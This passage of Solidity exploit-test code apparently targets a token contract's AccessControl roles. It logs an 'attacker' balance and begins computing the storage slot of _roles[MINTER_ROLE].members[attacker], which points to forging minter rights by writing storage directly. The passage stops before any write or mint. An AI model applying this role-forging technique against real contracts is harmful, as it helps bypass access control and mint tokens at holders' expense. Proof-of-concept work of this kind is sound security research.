        // Get role constants
        bytes32 MINTER_ROLE = keccak256("MINTER_ROLE");

        // Record initial balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Initial balance:", initialBalance);

        // Calculate correct storage slot for _roles[MINTER_ROLE].members[attacker]
        // _roles is at slot 0 (first variable in AccessControl)
        // For mapping(bytes32 => RoleData), the slot for _roles[role] is keccak256(abi.encode(role, 0))
